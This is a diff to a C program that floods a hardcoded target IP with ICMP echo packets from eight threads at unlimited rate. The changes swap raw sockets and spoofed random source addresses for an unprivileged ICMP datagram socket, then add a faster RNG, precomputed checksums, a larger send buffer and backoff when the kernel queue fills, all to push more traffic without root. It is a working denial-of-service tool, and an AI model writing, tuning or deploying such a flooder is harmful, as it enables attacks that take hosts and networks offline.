@@ -5,6 +5,7 @@
 #include <stdint.h>
 #include <string.h>
 #include <time.h>
+#include <errno.h>
 #include <unistd.h>
 #include <pthread.h>
 #include <signal.h>
@@ -13,9 +14,9 @@
 #include <netinet/ip_icmp.h>
 #include <sys/socket.h>
 
-#define TARGET_IP     "192.168.1.23"
+#define TARGET_IP     "10.10.20.21"
 #define WORKERS       8
-#define PAYLOAD_SIZE  65495
+#define PAYLOAD_SIZE  1452   /* Keep below MTU for datagram mode */
 #define RATE_LIMIT_S  0.0   /* Seconds to wait between packets; 0 for unlimited */
 
 struct worker_args {
@@ -32,7 +33,25 @@ static void handle_sigint(int signum) {
     keep_running = 0;
 }
 
-static uint16_t checksum(const void *data, size_t len) {
+/* Faster RNG than rand_r for per-packet mutations */
+struct fast_rng {
+    uint32_t state;
+};
+
+static inline uint32_t xorshift32(struct fast_rng *rng) {
+    uint32_t x = rng->state;
+    x ^= x << 13;
+    x ^= x >> 17;
+    x ^= x << 5;
+    rng->state = x ? x : 0x9E3779B9; /* avoid zero lockup */
+    return rng->state;
+}
+
+static inline uint16_t rand16(struct fast_rng *rng) {
+    return (uint16_t)xorshift32(rng);
+}
+
+static uint32_t checksum_partial(const void *data, size_t len) {
     const uint16_t *words = data;
     uint32_t sum = 0;
 
@@ -46,7 +65,10 @@ static uint16_t checksum(const void *data, size_t len) {
         memcpy(&last, words, 1);
         sum += last;
     }
+    return sum;
+}
 
+static uint16_t checksum_finalize(uint32_t sum) {
     while (sum >> 16) {
         sum = (sum & 0xFFFF) + (sum >> 16);
     }
@@ -54,15 +76,20 @@ static uint16_t checksum(const void *data, size_t len) {
     return (uint16_t)(~sum);
 }
 
-static uint32_t random_ipv4(unsigned int *seed) {
-    uint32_t addr = (uint32_t)rand_r(seed) << 16;
-    addr |= (uint32_t)rand_r(seed) & 0xFFFF;
-    return addr;
+static uint16_t checksum(const void *data, size_t len) {
+    return checksum_finalize(checksum_partial(data, len));
 }
 
-static void fill_payload(uint8_t *payload, size_t length, unsigned int *seed) {
-    for (size_t i = 0; i < length; ++i) {
-        payload[i] = (uint8_t)(rand_r(seed) & 0xFF);
+static void fill_payload(uint8_t *payload, size_t length, struct fast_rng *rng) {
+    uint32_t *p32 = (uint32_t *)payload;
+    size_t words = length / sizeof(uint32_t);
+    for (size_t i = 0; i < words; ++i) {
+        p32[i] = xorshift32(rng);
+    }
+    uint8_t *tail = (uint8_t *)(p32 + words);
+    size_t tail_start = words * sizeof(uint32_t);
+    for (size_t j = tail_start; j < length; ++j) {
+        tail[j - tail_start] = (uint8_t)xorshift32(rng);
     }
 }
 
@@ -77,23 +104,20 @@ static struct timespec rate_to_timespec(double rate_limit) {
 
 static void *flood_worker(void *arg) {
     struct worker_args *cfg = arg;
-    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)pthread_self());
-    size_t packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + cfg->payload_size;
+    size_t packet_size = sizeof(struct icmphdr) + cfg->payload_size;
     struct timespec ts = rate_to_timespec(cfg->rate_limit);
     uint16_t seq = cfg->base_seq;
+    struct fast_rng rng = {.state = (uint32_t)(time(NULL) ^ (uintptr_t)pthread_self()) | 1U};
 
-    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    /* Unprivileged ICMP datagram socket; kernel builds IP header */
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
     if (sock < 0) {
         perror("socket");
         return NULL;
     }
 
-    int on = 1;
-    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
-        perror("setsockopt IP_HDRINCL");
-        close(sock);
-        return NULL;
-    }
+    int sndbuf = 4 * 1024 * 1024;
+    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
 
     uint8_t *packet = malloc(packet_size);
     if (!packet) {
@@ -102,34 +126,30 @@ static void *flood_worker(void *arg) {
         return NULL;
     }
 
+    struct icmphdr *icmp = (struct icmphdr *)packet;
+    uint8_t *payload = packet + sizeof(struct icmphdr);
+
+    icmp->type = ICMP_ECHO;
+    icmp->code = 0;
+    icmp->un.echo.id = htons(getpid() & 0xFFFF);
+
+    fill_payload(payload, cfg->payload_size, &rng);
+    uint32_t payload_sum = checksum_partial(payload, cfg->payload_size);
+    struct timespec enobufs_sleep = {.tv_sec = 0, .tv_nsec = 1 * 1000 * 1000}; /* 1ms backing off on ENOBUFS */
+
     while (keep_running) {
-        struct iphdr *ip = (struct iphdr *)packet;
-        struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
-        uint8_t *payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
-
-        memset(packet, 0, packet_size);
-        fill_payload(payload, cfg->payload_size, &seed);
-
-        ip->ihl = 5;
-        ip->version = 4;
-        ip->tos = 0;
-        ip->tot_len = htons(packet_size);
-        ip->id = htons((uint16_t)rand_r(&seed));
-        ip->frag_off = 0;
-        ip->ttl = 64;
-        ip->protocol = IPPROTO_ICMP;
-        ip->saddr = random_ipv4(&seed);
-        ip->daddr = cfg->target.sin_addr.s_addr;
-        ip->check = checksum(ip, sizeof(struct iphdr));
-
-        icmp->type = ICMP_ECHO;
-        icmp->code = 0;
-        icmp->un.echo.id = htons(getpid() & 0xFFFF);
         icmp->un.echo.sequence = htons(seq++);
-        icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + cfg->payload_size);
+        uint16_t type_code = ((uint16_t)icmp->type << 8) | icmp->code;
+        uint32_t icmp_sum = payload_sum + type_code + icmp->un.echo.id + icmp->un.echo.sequence;
+        icmp->checksum = checksum_finalize(icmp_sum);
 
         if (sendto(sock, packet, packet_size, 0,
                    (struct sockaddr *)&cfg->target, sizeof(cfg->target)) < 0) {
+            if (errno == ENOBUFS) {
+                /* Kernel send queue full; brief pause to relieve pressure */
+                nanosleep(&enobufs_sleep, NULL);
+                continue;
+            }
             perror("sendto");
             break;
         }
